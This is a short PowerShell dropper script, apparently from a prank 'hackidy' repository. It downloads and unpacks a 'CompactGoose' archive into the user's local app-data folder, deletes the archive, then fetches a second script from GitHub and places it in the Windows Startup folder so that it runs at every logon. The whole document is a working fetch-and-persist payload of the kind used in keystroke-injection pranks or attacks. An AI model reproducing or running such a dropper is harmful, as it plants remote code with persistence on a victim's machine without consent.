wget https://github.com/jamani133/hackidy/raw/main/CompactGoose.zip -outfile $env:LOCALAPPDATA/goose.zip
Expand-Archive -Path $env:LOCALAPPDATA/goose.zip -DestinationPath $env:LOCALAPPDATA/goose
rm $env:LOCALAPPDATA/goose.zip
wget "https://github.com/jamani133/hackidy/raw/main/files/gooseRun.ps1" -outfile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\gooseRun.ps1"